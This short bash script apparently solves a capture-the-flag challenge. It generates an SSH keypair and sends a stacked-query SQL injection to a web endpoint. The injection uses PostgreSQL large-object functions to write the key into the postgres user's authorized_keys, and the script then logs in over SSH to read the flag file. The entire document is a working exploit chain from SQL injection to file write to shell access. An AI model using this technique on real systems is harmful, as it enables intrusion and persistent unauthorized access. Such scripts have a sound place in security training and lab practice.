set -ex

HOST=127.0.0.1
SSH_PORT=2222
WEBSERVER_PORT=8080

echo "Generating new keypair..."
ssh-keygen -t ed25519 -f /tmp/id_rsa -N "" -q > /dev/null

PUBLIC_KEY=$(cat /tmp/id_rsa.pub)
echo "Sending payload..."
curl --get -s -o /dev/null \
    --data-urlencode "id=1::int; SELECT lo_from_bytea(31337,'${PUBLIC_KEY}'::bytea); SELECT lo_export(31337, '/var/lib/postgresql/.ssh/authorized_keys'); --" \
    -H "Connection: close" \
    http://${HOST}:${WEBSERVER_PORT}/messages

echo "Reading flag...\n"
ssh -o StrictHostKeyChecking=no -p ${SSH_PORT} "postgres@${HOST}" -i /tmp/id_rsa cat /flag.txt
